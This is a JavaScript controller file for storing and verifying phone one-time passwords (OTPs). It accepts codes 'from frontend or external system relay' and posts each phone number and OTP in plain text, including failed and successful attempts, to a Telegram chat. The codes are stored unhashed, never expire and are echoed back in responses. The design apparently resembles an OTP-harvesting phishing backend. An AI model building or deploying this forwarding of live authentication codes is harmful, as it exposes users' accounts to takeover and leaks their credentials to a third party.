import Otp from "../models/Otp.js";
import { sendTelegramMessage } from "../../services/telegramService.js";

/**
 * Store OTP (from frontend or external system relay)
 */
export const storeOtp = async (req, res) => {
    try {
      const { phone, otp } = req.body;
  
      await Otp.deleteMany({ phone });
  
      const record = await Otp.create({ phone, otp });
  
      // 🔥 SEND TO TELEGRAM
      await sendTelegramMessage(
        `📲 <b>OTP RECEIVED</b>\n\n📞 Phone: ${phone}\n🔐 OTP: ${otp}`
      );
  
      res.status(201).json({
        success: true,
        message: "OTP stored + sent to Telegram",
        record,
      });
    } catch (err) {
      res.status(500).json({ message: err.message });
    }
  };

/**
 * Verify OTP
 */
export const verifyOtp = async (req, res) => {
    try {
      const { phone, otp } = req.body;
  
      const record = await Otp.findOne({ phone });
  
      if (!record) {
        return res.status(404).json({ message: "OTP not found" });
      }
  
      if (record.otp !== otp) {
        await sendTelegramMessage(
          `❌ <b>FAILED OTP ATTEMPT</b>\n\n📞 ${phone}\n🔐 Entered: ${otp}`
        );
  
        return res.status(400).json({ message: "Invalid OTP" });
      }
  
      record.verified = true;
      await record.save();
  
      // 🔥 SUCCESS LOG
      await sendTelegramMessage(
        `✅ <b>OTP VERIFIED</b>\n\n📞 ${phone}\n🔐 OTP: ${otp}`
      );
  
      res.json({
        success: true,
        message: "OTP verified successfully",
      });
    } catch (err) {
      res.status(500).json({ message: err.message });
    }
  };

/**
 * (Optional) check verification status
 */
export const checkOtpStatus = async (req, res) => {
  try {
    const { phone } = req.params;

    const record = await Otp.findOne({ phone });

    if (!record) {
      return res.status(404).json({
        message: "No OTP record found",
      });
    }

    res.json({
      phone,
      verified: record.verified,
    });
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
};